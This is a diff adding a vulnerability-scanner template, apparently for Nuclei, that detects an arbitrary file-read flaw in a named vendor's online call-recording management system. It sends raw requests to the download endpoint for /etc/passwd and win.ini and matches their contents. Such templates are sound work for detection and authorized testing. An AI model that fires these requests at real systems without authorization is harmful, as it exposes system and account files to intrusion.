@@ -1,0 +1,29 @@
+id: shenoutongxin-download-File-reading
+
+info:
+  name: 申瓯通信 在线录音管理系统 download 任意文件读取漏洞
+  author: unknown
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET  /main/download?path=/etc/passwd HTTP/1.1 
+        Host: {{Hostname}} 
+ 
+      - |
+        GET  /main/download?path=C:/windows/win.ini HTTP/1.1 
+        Host: {{Hostname}} 
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
